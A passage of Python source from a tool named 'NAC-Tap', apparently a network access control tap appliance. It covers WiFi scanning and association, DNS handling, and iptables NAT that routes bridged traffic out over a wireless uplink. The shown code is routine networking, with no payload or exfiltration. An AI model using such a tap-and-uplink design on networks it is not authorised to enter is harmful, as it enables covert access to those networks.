                    run_cmd(['resolvectl', 'dns', interface, dns], check=False)
                log(f"Client DNS configured via systemd-resolved: {filtered_dns}", 'SUCCESS')
                return True
            
            # Fallback: Update resolv.conf directly
            try:
                # Backup existing resolv.conf
                if os.path.exists('/etc/resolv.conf'):
                    run_cmd(['cp', '/etc/resolv.conf', '/etc/resolv.conf.bak'], check=False)
                
                # Write new resolv.conf
                with open('/etc/resolv.conf', 'w') as f:
                    f.write("# DNS configured by NAC-Tap (Client WLAN)\n")
                    for dns in filtered_dns:
                        f.write(f"nameserver {dns}\n")
                    f.write("options timeout:2 attempts:3\n")
                
                log(f"Client DNS configured via resolv.conf: {filtered_dns}", 'SUCCESS')
                return True
            except Exception as e:
                log(f"Failed to configure DNS via resolv.conf: {e}", 'WARNING')
                return False
            
        except Exception as e:
            log(f"Client DNS configuration failed: {e}", 'WARNING')
            return False
    
    def validate_dns_config(self):
        """Check for DNS configuration conflicts"""
        try:
            conflicts = []
            
            # Check if dnsmasq is running on wrong interface
            result = run_cmd(['systemctl', 'is-active', 'dnsmasq'], check=False)
            if result and result.returncode == 0:
                dnsmasq_conf = '/etc/dnsmasq.conf'
                if os.path.exists(dnsmasq_conf):
                    with open(dnsmasq_conf, 'r') as f:
                        config = f.read()
                    
                    # Check for interface bindings
                    if 'interface=' in config:
                        # Check if it's binding to client interface
                        client_iface = CONFIG.get('WIFI_CLIENT_INTERFACE')
                        if client_iface and f'interface={client_iface}' in config:
                            conflicts.append(f"dnsmasq is bound to client interface {client_iface}")
            
            # Check resolv.conf for AP IP when client is active
            if os.path.exists('/etc/resolv.conf'):
                with open('/etc/resolv.conf', 'r') as f:
                    resolv = f.read()
                
                client_iface = CONFIG.get('WIFI_CLIENT_INTERFACE')
                if client_iface and self.ap_ip in resolv:
                    # This might be OK if AP is also active, but log it
                    log(f"resolv.conf contains AP IP ({self.ap_ip}) - may cause conflicts", 'WARNING')
            
            if conflicts:
                log("DNS conflicts detected:", 'WARNING')
                for conflict in conflicts:
                    log(f"  - {conflict}", 'WARNING')
                return False
            
            log("No DNS conflicts detected", 'SUCCESS')
            return True
            
        except Exception as e:
            log(f"DNS validation failed: {e}", 'WARNING')
            return False

# ============================================================================
# WIFI MANAGER
# ============================================================================

class WiFiManager:
    """Manages WiFi AP connection and scanning"""

    def __init__(self):
        self.ap_interface = CONFIG.get('WIFI_AP_INTERFACE', 'wlan0')
        self.client_interface = None
        self.interface = None  # Currently active client interface
        self.ssid = None
        self.password = None
        self.connected = False
        self.scan_results = []
        self.ip_address = None
        self.gateway = None
        self.internet_available = False
        self.dns_manager = DNSManager()  # DNS conflict prevention
        
        # Auto-detect client interface on initialization
        detected = detect_wifi_client_interface()
        if detected:
            self.client_interface = detected
        else:
            # Fallback: try to detect manually
            for candidate in ['wlan1', 'wlan2']:
                if candidate != self.ap_interface:
                    result = run_cmd(['ip', 'link', 'show', candidate], check=False)
                    if result and result.returncode == 0:
                        self.client_interface = candidate
                        CONFIG['WIFI_CLIENT_INTERFACE'] = candidate
                        break
        
        # Check for DNS conflicts on initialization
        self.dns_manager.prevent_dnsmasq_conflicts()

    def get_wifi_interfaces(self):
        """Get available WLAN interfaces for client mode (excludes AP interface)"""
        interfaces = []
        ap_interface = self.ap_interface
        
        result = run_cmd(['ip', '-o', 'link', 'show'])
        if result and result.returncode == 0:
            for line in result.stdout.split('\n'):
                if 'wlan' in line.lower() or 'wlp' in line.lower():
                    parts = line.split(':')
                    if len(parts) >= 2:
                        iface = parts[1].strip().split('@')[0]
                        # Exclude AP interface - it's for management only
                        if iface != ap_interface and iface not in interfaces:
                            # Verify it's a wireless interface
                            if (os.path.exists(f"/sys/class/net/{iface}/wireless") or
                                    os.path.exists(f"/sys/class/net/{iface}/phy80211")):
                                interfaces.append(iface)
        
        # If no interfaces found but we have a detected client interface, include it
        if not interfaces and self.client_interface:
            interfaces.append(self.client_interface)
        
        return interfaces

    def scan_aps(self, interface):
        """Scan for available access points using iw"""
        self.scan_results = []
        try:
            # Use iw dev <interface> scan (no NetworkManager needed)
            result = run_cmd(['iw', 'dev', interface, 'scan'], timeout=15, check=False)
            if result and result.returncode == 0:
                current_ap = {}
                for line in result.stdout.split('\n'):
                    line = line.strip()
                    if not line:
                        continue
                    
                    # SSID
                    if line.startswith('SSID:'):
                        if current_ap:
                            self.scan_results.append(current_ap)
                        ssid = line.split('SSID:')[1].strip()
                        current_ap = {'ssid': ssid, 'signal': -100, 'security': 'Unknown', 'channel': '0'}
                    
                    # Signal strength
                    elif 'signal:' in line.lower():
                        sig_match = re.search(r'signal:\s*(-?\d+\.?\d*)', line, re.IGNORECASE)
                        if sig_match:
                            try:
                                current_ap['signal'] = int(float(sig_match.group(1)))
                            except:
                                pass
                    
                    # Security (WPA/WPA2)
                    elif 'WPA' in line or 'RSN' in line:
                        if 'WPA2' in line or 'RSN' in line:
                            current_ap['security'] = 'WPA2'
                        elif 'WPA' in line:
                            current_ap['security'] = 'WPA'
                    
                    # Channel
                    elif 'freq:' in line.lower():
                        freq_match = re.search(r'freq:\s*(\d+)', line, re.IGNORECASE)
                        if freq_match:
                            try:
                                freq = int(freq_match.group(1))
                                # Convert frequency to channel (approximate)
                                if 2412 <= freq <= 2484:  # 2.4 GHz
                                    channel = (freq - 2412) // 5 + 1
                                elif 5170 <= freq <= 5825:  # 5 GHz
                                    channel = (freq - 5000) // 5
                                else:
                                    channel = '0'
                                current_ap['channel'] = str(channel)
                            except:
                                pass
                
                # Add last AP
                if current_ap:
                    self.scan_results.append(current_ap)
                
                # Remove duplicates (same SSID)
                seen = set()
                unique_results = []
                for ap in self.scan_results:
                    if ap['ssid'] not in seen:
                        seen.add(ap['ssid'])
                        unique_results.append(ap)
                self.scan_results = unique_results
                
                log(f"Found {len(self.scan_results)} access points", 'INFO')
            else:
                # Fallback to iwlist if iw fails
                result = run_cmd(['iwlist', interface, 'scan'], timeout=15, check=False)
                if result and result.returncode == 0:
                    current_ap = {}
                    for line in result.stdout.split('\n'):
                        line = line.strip()
                        if 'ESSID:' in line:
                            if current_ap:
                                self.scan_results.append(current_ap)
                            current_ap = {'ssid': line.split('ESSID:')[1].strip().strip('"'), 'signal': -100, 'security': 'Open', 'channel': '0'}
                        elif 'Signal level=' in line:
                            sig_match = re.search(r'Signal level=(-?\d+)', line)
                            if sig_match:
                                current_ap['signal'] = int(sig_match.group(1))
                        elif 'Encryption key:' in line:
                            current_ap['security'] = 'WPA2' if 'on' in line else 'Open'
                        elif 'Channel:' in line:
                            ch_match = re.search(r'Channel:(\d+)', line)
                            if ch_match:
                                current_ap['channel'] = ch_match.group(1)
                    if current_ap:
                        self.scan_results.append(current_ap)
                else:
                    error = result.stderr if result else "Unknown error"
                    log(f"AP scan failed: {error}", 'ERROR')
        except Exception as e:
            log(f"AP scan failed: {e}", 'ERROR')
        return self.scan_results

    def connect_to_ap(self, interface, ssid, password=None):
        """Connect to WiFi AP using wpa_supplicant and systemd-networkd"""
        try:
            self.interface = interface
            self.ssid = ssid
            self.password = password
            
            log(f"Connecting to WiFi using wpa_supplicant...", 'INFO')
            
            # Step 1: Create wpa_supplicant config
            config_file = self._create_wpa_supplicant_config(interface, ssid, password)
            if not config_file:
                return {'success': False, 'error': 'Failed to create wpa_supplicant config'}
            
            # Step 2: Start wpa_supplicant and wait for association
            if not self._start_wpa_supplicant(interface, config_file):
                return {'success': False, 'error': 'Failed to associate with WiFi network'}
            
            log("WiFi associated. Configuring network with systemd-networkd...", 'INFO')
            
            # Step 3: Create systemd-networkd config for DHCP
            if not self._create_systemd_network_config(interface):
                log("Warning: systemd-networkd config failed, trying manual DHCP...", 'WARNING')
                # Fallback: try dhclient manually
                result = run_cmd(['dhclient', interface], timeout=30, check=False)
                if not result or result.returncode != 0:
                    return {'success': False, 'error': 'Failed to configure network'}
            
            # Step 4: Wait for DHCP lease (up to 15 seconds)
            max_wait = 15
            waited = 0
            network_info = None
            while waited < max_wait:
                network_info = self._get_network_info(interface)
                if network_info['ip_address']:
                    break
                time.sleep(2)
                waited += 2
            
            if not network_info or not network_info['ip_address']:
                return {'success': False, 'error': 'DHCP timeout - no IP address obtained'}
            
            # Step 5: Store network information
            self.ip_address = network_info['ip_address']
            self.gateway = network_info['gateway']
            dns_servers = network_info['dns_servers']
            
            log(f"Network configured. IP: {self.ip_address}, Gateway: {self.gateway}", 'SUCCESS')
            
            # Step 6: Configure DNS for client interface (prevent conflicts with AP)
            self.dns_manager.configure_client_dns(interface, dns_servers)
            
            self.connected = True
            
            # Step 7: Prevent DNS conflicts before setting up routing
            self._prevent_dns_conflicts()
            
            # Step 8: Setup routing for internet access through WLAN
            self._setup_wlan_routing(interface, dns_servers)
            
            # Step 9: Test internet
            self.internet_available = self.test_internet_connectivity()['connected']
            return {'success': True, 'connected': True, 'internet': self.test_internet_connectivity()}
            
        except Exception as e:
            log(f"WiFi connection error: {e}", 'ERROR')
            return {'success': False, 'error': str(e)}

    def _configure_dns(self, interface, dns_servers):
        """Configure DNS servers for the interface (legacy method - use DNSManager instead)"""
        # Delegate to DNSManager to prevent conflicts
        if interface == self.ap_interface:
            self.dns_manager.configure_ap_dns()
        else:
            self.dns_manager.configure_client_dns(interface, dns_servers)
    
    def _create_wpa_supplicant_config(self, interface, ssid, password=None):
        """Create wpa_supplicant config file for WiFi connection"""
        try:
            config_file = f"/tmp/wpa_supplicant-{interface}.conf"
            
            with open(config_file, 'w') as f:
                f.write("ctrl_interface=/var/run/wpa_supplicant\n")
                f.write("update_config=1\n")
                f.write("\n")
                f.write("network={\n")
                f.write(f'    ssid="{ssid}"\n')
                
                if password:
                    # Generate PSK from password
                    result = run_cmd(['wpa_passphrase', ssid, password], check=False)
                    if result and result.returncode == 0:
                        # Extract psk from wpa_passphrase output
                        for line in result.stdout.split('\n'):
                            if 'psk=' in line:
                                f.write(f"    {line.strip()}\n")
                                break
                    else:
                        # Fallback: use password directly (less secure but works)
                        f.write(f'    psk="{password}"\n')
                    f.write("    key_mgmt=WPA-PSK\n")
                else:
                    f.write("    key_mgmt=NONE\n")
                
                f.write("}\n")
            
            log(f"Created wpa_supplicant config: {config_file}", 'INFO')
            return config_file
        except Exception as e:
            log(f"Failed to create wpa_supplicant config: {e}", 'ERROR')
            return None
    
    def _start_wpa_supplicant(self, interface, config_file):
        """Start wpa_supplicant daemon and wait for association"""
        try:
            # Kill any existing wpa_supplicant for this interface
            run_cmd(['pkill', '-f', f'wpa_supplicant.*-i.*{interface}'], check=False)
            time.sleep(1)
            
            # Bring interface up
            run_cmd(['ip', 'link', 'set', interface, 'up'], check=False)
            time.sleep(1)
            
            # Start wpa_supplicant
            pid_file = f"/var/run/wpa_supplicant-{interface}.pid"
            result = run_cmd([
                'wpa_supplicant', '-B', '-i', interface,
                '-c', config_file, '-P', pid_file
            ], timeout=10)
            
            if result and result.returncode == 0:
                log(f"wpa_supplicant started for {interface}", 'INFO')
                
                # Wait for association (poll up to 30 seconds)
                max_wait = 30
                waited = 0
                while waited < max_wait:
                    result = run_cmd(['iw', 'dev', interface, 'link'], check=False)
                    if result and result.returncode == 0 and 'Connected' in result.stdout:
                        log(f"WiFi associated to network on {interface}", 'SUCCESS')
                        return True
                    time.sleep(2)
                    waited += 2
                
                log(f"WiFi association timeout after {max_wait} seconds", 'WARNING')
                return False
            else:
                error = result.stderr if result else "Unknown error"
                log(f"Failed to start wpa_supplicant: {error}", 'ERROR')
                return False
        except Exception as e:
            log(f"wpa_supplicant start error: {e}", 'ERROR')
            return False
    
    def _create_systemd_network_config(self, interface):
        """Create systemd-networkd config file for DHCP"""
        try:
            network_file = f"/etc/systemd/network/25-{interface}.network"
            
            with open(network_file, 'w') as f:
                f.write(f"[Match]\n")
                f.write(f"Name={interface}\n")
                f.write(f"\n")
                f.write(f"[Network]\n")
                f.write(f"DHCP=yes\n")
            
            log(f"Created systemd-networkd config: {network_file}", 'INFO')
            
            # Reload systemd-networkd
            result = run_cmd(['systemctl', 'reload', 'systemd-networkd'], check=False)
            if result and result.returncode == 0:
                log("systemd-networkd reloaded", 'INFO')
                return True
            else:
                log("Failed to reload systemd-networkd", 'WARNING')
                return False
        except Exception as e:
            log(f"Failed to create systemd-networkd config: {e}", 'ERROR')
            return False
    
    def _get_network_info(self, interface):
        """Extract IP, gateway, and DNS information after DHCP"""
        ip_address = None
        gateway = None
        dns_servers = []
        
        try:
            # Get IP address
            result = run_cmd(['ip', 'addr', 'show', interface])
            if result:
                ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/\d+', result.stdout)
                if ip_match:
                    ip_address = ip_match.group(1)
                    log(f"IP address: {ip_address}", 'INFO')
            
            # Get gateway
            result = run_cmd(['ip', 'route', 'show', 'default'])
            if result:
                gw_match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', result.stdout)
                if gw_match:
                    gateway = gw_match.group(1)
                    log(f"Gateway: {gateway}", 'INFO')
            
            # Get DNS servers
            result = run_cmd(['resolvectl', 'status', interface], check=False)
            if result and result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'DNS Servers:' in line or 'Current DNS Server:' in line:
                        dns_match = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
                        if dns_match:
                            dns_servers = dns_match
                            log(f"DNS servers from resolvectl: {dns_servers}", 'INFO')
                            break
            
            # Fallback: read resolv.conf
            if not dns_servers:
                try:
                    with open('/etc/resolv.conf', 'r') as f:
                        for line in f:
                            if line.startswith('nameserver'):
                                dns = line.split()[1].strip()
                                if dns and re.match(r'^\d+\.\d+\.\d+\.\d+$', dns):
                                    dns_servers.append(dns)
                    if dns_servers:
                        log(f"DNS servers from resolv.conf: {dns_servers}", 'INFO')
                except:
                    pass
            
            # Final fallback: use gateway or public DNS
            if not dns_servers:
                if gateway:
                    dns_servers = [gateway]
                    log(f"Using gateway as DNS: {gateway}", 'WARNING')
                else:
                    dns_servers = ['8.8.8.8', '1.1.1.1']
                    log("Using public DNS: 8.8.8.8, 1.1.1.1", 'WARNING')
            
            return {
                'ip_address': ip_address,
                'gateway': gateway,
                'dns_servers': dns_servers
            }
        except Exception as e:
            log(f"Error getting network info: {e}", 'WARNING')
            return {
                'ip_address': None,
                'gateway': None,
                'dns_servers': ['8.8.8.8', '1.1.1.1']
            }
    
    def _prevent_dns_conflicts(self):
        """Prevent DNS conflicts between AP and client WLAN"""
        try:
            log("Preventing DNS conflicts...", 'INFO')
            
            # Ensure dnsmasq only listens on AP interface
            self.dns_manager.prevent_dnsmasq_conflicts()
            
            # Validate current DNS configuration
            self.dns_manager.validate_dns_config()
            
            return True
        except Exception as e:
            log(f"DNS conflict prevention failed: {e}", 'WARNING')
            return False

    def _setup_wlan_routing(self, wlan_interface, dns_servers=None):
        """Setup routing so non-private traffic exits through WLAN interface"""
        try:
            log(f"Setting up internet routing through {wlan_interface}...")
            
            # Get WLAN IP and gateway
            result = run_cmd(['ip', 'addr', 'show', wlan_interface])
            wlan_ip = None
            if result:
                ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/\d+', result.stdout)
                if ip_match:
                    wlan_ip = ip_match.group(1)
            
            result = run_cmd(['ip', 'route', 'show', 'default'])
            wlan_gateway = None
            if result:
                gw_match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', result.stdout)
                if gw_match:
                    wlan_gateway = gw_match.group(1)
            
            if not wlan_gateway:
                log("No default gateway found on WLAN interface", 'WARNING')
                return False
            
            # Enable IP forwarding
            run_cmd(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
            log("IP forwarding enabled")
            
            # Get bridge and eth interfaces
            bridge_name = CONFIG.get('BRIDGE_NAME', 'br0')
            eth_interfaces = []
            result = run_cmd(['ip', '-o', 'link', 'show'])
            if result:
                for line in result.stdout.split('\n'):
                    if 'eth' in line.lower() and 'link/ether' in line.lower():
                        parts = line.split(':')
                        if len(parts) >= 2:
                            iface = parts[1].strip().split('@')[0]
                            if re.match(r'^eth[0-9]', iface):
                                eth_interfaces.append(iface)
            
            # Setup routing table for public IPs via WLAN
            # Keep private IPs on bridge/eth interfaces
            private_networks = [
                '10.0.0.0/8',
                '172.16.0.0/12',
                '192.168.0.0/16',
                '169.254.0.0/16'
            ]
            
            # Add routes for private networks through bridge/eth if needed
            # These should already exist but ensure they're prioritized for local traffic
            for eth_iface in eth_interfaces:
                # Ensure private network routes use eth/bridge, not WLAN
                for private_net in private_networks:
                    # Check if route exists
                    result = run_cmd(['ip', 'route', 'show', private_net])
                    if not result or private_net not in result.stdout:
                        # Add route for private network via bridge
                        run_cmd(['ip', 'route', 'add', private_net, 'dev', bridge_name], check=False)
            
            # Ensure default route uses WLAN interface
            # Remove existing default routes that don't use WLAN
            result = run_cmd(['ip', 'route', 'show', 'default'])
            if result and result.stdout:
                for line in result.stdout.split('\n'):
                    if 'default' in line and wlan_interface not in line:
                        # Check if this is a specific default route
                        if 'via' in line:
                            # Extract gateway from route
                            gw_match = re.search(r'via (\S+)', line)
                            if gw_match and gw_match.group(1) != wlan_gateway:
                                # Delete the old default route
                                run_cmd(['ip', 'route', 'del', 'default'], check=False)
                                break
            
            # Add default route via WLAN if not present
            result = run_cmd(['ip', 'route', 'show', 'default'])
            if not result or wlan_interface not in result.stdout:
                run_cmd(['ip', 'route', 'add', 'default', 'via', wlan_gateway, 'dev', wlan_interface])
                log(f"Added default route via {wlan_gateway} on {wlan_interface}")
            
            # Setup NAT/MASQUERADE for traffic going out WLAN
            # Check if rule already exists
            result = run_cmd(['iptables', '-t', 'nat', '-C', 'POSTROUTING', '-o', wlan_interface, '-j', 'MASQUERADE'], check=False)
            if result and result.returncode != 0:
                # Rule doesn't exist, add it
                run_cmd(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', wlan_interface, '-j', 'MASQUERADE'])
                log(f"NAT/MASQUERADE enabled on {wlan_interface}")
            
            # Allow forwarding from bridge to WLAN
            result = run_cmd(['iptables', '-C', 'FORWARD', '-i', bridge_name, '-o', wlan_interface, '-j', 'ACCEPT'], check=False)
            if result and result.returncode != 0:
                run_cmd(['iptables', '-I', 'FORWARD', '1', '-i', bridge_name, '-o', wlan_interface, '-j', 'ACCEPT'])
                log(f"Forwarding rule added: {bridge_name} -> {wlan_interface}")
            
            # Allow forwarding from WLAN to bridge (for return traffic)
            result = run_cmd(['iptables', '-C', 'FORWARD', '-i', wlan_interface, '-o', bridge_name, '-m', 'state', '--state', 'ESTABLISHED,RELATED', '-j', 'ACCEPT'], check=False)
            if result and result.returncode != 0:
                run_cmd(['iptables', '-I', 'FORWARD', '1', '-i', wlan_interface, '-o', bridge_name, '-m', 'state', '--state', 'ESTABLISHED,RELATED', '-j', 'ACCEPT'])
                log(f"Return forwarding rule added: {wlan_interface} -> {bridge_name}")
            
            # Allow DNS traffic (port 53 UDP/TCP) through OUTPUT chain for appliance itself
            # This ensures DNS queries from the appliance go out WLAN interface
            log("Adding DNS forwarding rules in iptables OUTPUT chain...", 'INFO')
            
            # Allow DNS outbound on WLAN interface
            result = run_cmd(['iptables', '-C', 'OUTPUT', '-o', wlan_interface, '-p', 'udp', '--dport', '53', '-j', 'ACCEPT'], check=False)
            if result and result.returncode != 0:
                run_cmd(['iptables', '-I', 'OUTPUT', '1', '-o', wlan_interface, '-p', 'udp', '--dport', '53', '-j', 'ACCEPT'])
                log("DNS UDP output rule added for WLAN", 'INFO')
            
            result = run_cmd(['iptables', '-C', 'OUTPUT', '-o', wlan_interface, '-p', 'tcp', '--dport', '53', '-j', 'ACCEPT'], check=False)
            if result and result.returncode != 0:
                run_cmd(['iptables', '-I', 'OUTPUT', '1', '-o', wlan_interface, '-p', 'tcp', '--dport', '53', '-j', 'ACCEPT'])
                log("DNS TCP output rule added for WLAN", 'INFO')
            
            # Allow HTTP/HTTPS outbound on WLAN interface
            result = run_cmd(['iptables', '-C', 'OUTPUT', '-o', wlan_interface, '-p', 'tcp', '--dport', '80', '-j', 'ACCEPT'], check=False)
            if result and result.returncode != 0:
                run_cmd(['iptables', '-I', 'OUTPUT', '1', '-o', wlan_interface, '-p', 'tcp', '--dport', '80', '-j', 'ACCEPT'])
            
            result = run_cmd(['iptables', '-C', 'OUTPUT', '-o', wlan_interface, '-p', 'tcp', '--dport', '443', '-j', 'ACCEPT'], check=False)
            if result and result.returncode != 0:
                run_cmd(['iptables', '-I', 'OUTPUT', '1', '-o', wlan_interface, '-p', 'tcp', '--dport', '443', '-j', 'ACCEPT'])
            
            # Ensure DNS traffic goes through WLAN
            if dns_servers:
                log(f"Verifying DNS servers routing: {dns_servers}", 'INFO')
                for dns in dns_servers:
                    # Ensure route to DNS server via WLAN
                    result = run_cmd(['ip', 'route', 'get', dns])
                    if result:
                        log(f"Route to DNS {dns}: {result.stdout.strip()}", 'INFO')
                        if wlan_interface not in result.stdout:
                            log(f"DNS server {dns} not routed via WLAN, route: {result.stdout.strip()}", 'WARNING')
                            # If it's a private IP (gateway), add specific route
                            if re.match(r'^(10|172\.(1[6-9]|2[0-9]|3[01])|192\.168|169\.254)\.', dns):
                                log(f"Adding route to private DNS server {dns} via {wlan_gateway}", 'INFO')
                                run_cmd(['ip', 'route', 'add', dns, 'via', wlan_gateway, 'dev', wlan_interface], check=False)
            
            # Flush DNS cache if systemd-resolved is active
            result = run_cmd(['systemctl', 'is-active', 'systemd-resolved'], check=False)
            if result and result.returncode == 0:
                log("Flushing DNS cache via systemd-resolved...", 'INFO')
                run_cmd(['resolvectl', 'flush-caches'], check=False)
            
            # Restart systemd-resolved to pick up new DNS config
            result = run_cmd(['systemctl', 'restart', 'systemd-resolved'], check=False)
            if result and result.returncode == 0:
                log("Restarted systemd-resolved", 'INFO')
            
            # Verify DNS configuration
            log("Verifying DNS configuration...", 'INFO')
            result = run_cmd(['cat', '/etc/resolv.conf'])
            if result:
                log(f"Current resolv.conf:\n{result.stdout[:500]}", 'INFO')
            
            result = run_cmd(['ip', 'route', 'show', 'default'])
            if result:
                log(f"Default route: {result.stdout.strip()}", 'INFO')
            
            # Test DNS connectivity immediately
            log("Testing DNS connectivity...", 'INFO')
            if dns_servers:
                test_dns = dns_servers[0]
                result = run_cmd(['dig', '@' + test_dns, 'google.com', '+short', '+timeout=3'], timeout=5)
                if result and result.returncode == 0 and result.stdout.strip():
                    log(f"DNS test successful! Querying {test_dns} for google.com returned: {result.stdout.strip()[:100]}", 'SUCCESS')
                else:
                    log(f"DNS test failed for {test_dns}. Trying ping test...", 'WARNING')
                    # Try ping to DNS server
                    result = run_cmd(['ping', '-c', '1', '-W', '2', test_dns], timeout=3)
                    if result and result.returncode == 0:
                        log(f"DNS server {test_dns} is reachable via ping", 'INFO')
                    else:
                        log(f"DNS server {test_dns} is NOT reachable", 'ERROR')
            else:
                log("No DNS servers configured for testing", 'WARNING')
            
            log(f"Internet routing configured for {wlan_interface}", 'SUCCESS')
            return True
            
        except Exception as e:
            log(f"WLAN routing setup failed: {e}", 'ERROR')
            import traceback
            log(traceback.format_exc(), 'ERROR')
            return False

    def _cleanup_wlan_routing(self, wlan_interface):
        """Cleanup routing rules for WLAN interface"""
        try:
            log(f"Cleaning up routing for {wlan_interface}...")
            
            # Remove OUTPUT chain rules
            run_cmd(['iptables', '-D', 'OUTPUT', '-o', wlan_interface, '-p', 'udp', '--dport', '53', '-j', 'ACCEPT'], check=False)
            run_cmd(['iptables', '-D', 'OUTPUT', '-o', wlan_interface, '-p', 'tcp', '--dport', '53', '-j', 'ACCEPT'], check=False)
            run_cmd(['iptables', '-D', 'OUTPUT', '-o', wlan_interface, '-p', 'tcp', '--dport', '80', '-j', 'ACCEPT'], check=False)
            run_cmd(['iptables', '-D', 'OUTPUT', '-o', wlan_interface, '-p', 'tcp', '--dport', '443', '-j', 'ACCEPT'], check=False)
            
            # Remove NAT rules
            run_cmd(['iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', wlan_interface, '-j', 'MASQUERADE'], check=False)
            
            # Remove forwarding rules
            bridge_name = CONFIG.get('BRIDGE_NAME', 'br0')
            run_cmd(['iptables', '-D', 'FORWARD', '-i', bridge_name, '-o', wlan_interface, '-j', 'ACCEPT'], check=False)
            run_cmd(['iptables', '-D', 'FORWARD', '-i', wlan_interface, '-o', bridge_name, '-m', 'state', '--state', 'ESTABLISHED,RELATED', '-j', 'ACCEPT'], check=False)
            
            # Remove default route if it uses WLAN
            result = run_cmd(['ip', 'route', 'show', 'default'])
            if result and wlan_interface in result.stdout:
                run_cmd(['ip', 'route', 'del', 'default'], check=False)
                log("Removed default route via WLAN")
            
            log(f"Routing cleanup completed for {wlan_interface}")
            return True
            
        except Exception as e:
            log(f"WLAN routing cleanup failed: {e}", 'WARNING')
            return False

    def disconnect_wifi(self):
        """Disconnect from WiFi and clean up wpa_supplicant and systemd-networkd"""
        try:
            wlan_iface = self.interface
            if wlan_iface:
                # Cleanup routing before disconnecting
                self._cleanup_wlan_routing(wlan_iface)
                
                # Kill wpa_supplicant
                run_cmd(['pkill', '-f', f'wpa_supplicant.*-i.*{wlan_iface}'], check=False)
                time.sleep(1)
                
                # Remove systemd-networkd config
                network_file = f"/etc/systemd/network/25-{wlan_iface}.network"
                if os.path.exists(network_file):
                    os.remove(network_file)
                    log(f"Removed systemd-networkd config: {network_file}", 'INFO')
                    run_cmd(['systemctl', 'reload', 'systemd-networkd'], check=False)
                
                # Remove wpa_supplicant config
                config_file = f"/tmp/wpa_supplicant-{wlan_iface}.conf"
                if os.path.exists(config_file):
                    os.remove(config_file)
                
                # Remove PID file
                pid_file = f"/var/run/wpa_supplicant-{wlan_iface}.pid"
                if os.path.exists(pid_file):
                    os.remove(pid_file)
                
                # Bring interface down
                run_cmd(['ip', 'link', 'set', wlan_iface, 'down'], check=False)
                
                log(f"WiFi disconnected from {wlan_iface}", 'INFO')
            
            self.connected = False
            self.ip_address = None
            self.gateway = None
            self.internet_available = False
            self.interface = None
            return True
        except Exception as e:
            log(f"WiFi disconnect error: {e}", 'ERROR')
            return False

    def test_internet_connectivity(self):
        """Test internet connectivity with detailed results"""
        ping_ok = False
        dns_ok = False
        http_ok = False
        ping_time = None
        dns_server = None
        http_status = None
        dns_error = None
        
        log("Starting internet connectivity test...", 'INFO')
        
        # Test ping with timing
        log("Testing ping to 8.8.8.8...", 'INFO')
        result = run_cmd(['ping', '-c', '3', '-W', '3', '8.8.8.8'], timeout=10)
        if result and result.returncode == 0:
            ping_ok = True
            log("Ping test: PASS", 'SUCCESS')
            # Extract average time
            time_match = re.search(r'min/avg/max.*?/([\d.]+)/', result.stdout)
            if time_match:
                ping_time = float(time_match.group(1))
                log(f"Average ping time: {ping_time} ms", 'INFO')
        else:
            log("Ping test: FAIL", 'ERROR')
            if result:
                log(f"Ping error: {result.stderr[:200] if result.stderr else result.stdout[:200]}", 'ERROR')
        
        # Test DNS - try multiple methods
        log("Testing DNS resolution...", 'INFO')
        
        # Try dig first (more reliable)
        result = run_cmd(['dig', 'google.com', '+short', '+timeout=3'], timeout=6)
        if result and result.returncode == 0 and result.stdout.strip():
            dns_ok = True
            resolved_ip = result.stdout.strip().split('\n')[0]
            log(f"DNS test (dig): PASS - google.com resolved to {resolved_ip}", 'SUCCESS')
            
            # Try to get DNS server from dig output
            result2 = run_cmd(['dig', 'google.com', '+stats'], timeout=6)
            if result2:
                server_match = re.search(r';; SERVER: ([\d.]+)', result2.stdout)
                if server_match:
                    dns_server = server_match.group(1)
        else:
            log("DNS test (dig): FAIL, trying nslookup...", 'WARNING')
            # Fallback to nslookup
            result = run_cmd(['nslookup', '-timeout=3', 'google.com'], timeout=6)
            if result and result.returncode == 0:
                # Check if we got a valid response
                if 'Address:' in result.stdout or 'Name:' in result.stdout:
                    dns_ok = True
                    log("DNS test (nslookup): PASS", 'SUCCESS')
                    # Extract DNS server used
                    server_match = re.search(r'Server:\s*(\S+)', result.stdout)
                    if server_match:
                        dns_server = server_match.group(1)
                else:
                    dns_error = "No valid DNS response"
                    log(f"DNS test (nslookup): FAIL - {dns_error}", 'ERROR')
            else:
                dns_error = result.stderr if result and result.stderr else "DNS query failed"
                log(f"DNS test (nslookup): FAIL - {dns_error}", 'ERROR')
        
        if not dns_ok:
            # Try testing with specific DNS server (8.8.8.8)
            log("Trying DNS test with 8.8.8.8 directly...", 'INFO')
            result = run_cmd(['dig', '@8.8.8.8', 'google.com', '+short', '+timeout=3'], timeout=6)
            if result and result.returncode == 0 and result.stdout.strip():
                dns_ok = True
                dns_server = '8.8.8.8'
                log("DNS test with 8.8.8.8: PASS", 'SUCCESS')
            else:
                log("DNS test with 8.8.8.8: FAIL", 'ERROR')
                # Check if we can reach 8.8.8.8 on port 53
                result = run_cmd(['nc', '-zv', '-w', '2', '8.8.8.8', '53'], timeout=3, check=False)
                if result and result.returncode == 0:
                    log("Port 53 (DNS) is reachable on 8.8.8.8", 'INFO')
                else:
                    log("Port 53 (DNS) is NOT reachable on 8.8.8.8 - check firewall/routing", 'ERROR')
        
        # Test HTTP connectivity
        log("Testing HTTP connectivity...", 'INFO')
        try:
            import urllib.request
            req = urllib.request.Request('http://www.google.com', timeout=5)
            with urllib.request.urlopen(req) as response:
                if response.status == 200:
                    http_ok = True
                    http_status = response.status
                    log(f"HTTP test: PASS - Status {http_status}", 'SUCCESS')
        except Exception as e:
            http_ok = False
            log(f"HTTP test: FAIL - {str(e)[:200]}", 'ERROR')
        
        connected = ping_ok and dns_ok
        self.internet_available = connected
        
        log(f"Internet connectivity test complete: Ping={ping_ok}, DNS={dns_ok}, HTTP={http_ok}, Overall={connected}", 
            'SUCCESS' if connected else 'ERROR')
        
        return {
            'ping': ping_ok,
            'ping_time': ping_time,
            'dns': dns_ok,
            'dns_server': dns_server,
            'dns_error': dns_error,
            'http': http_ok,
            'http_status': http_status,
            'connected': connected,
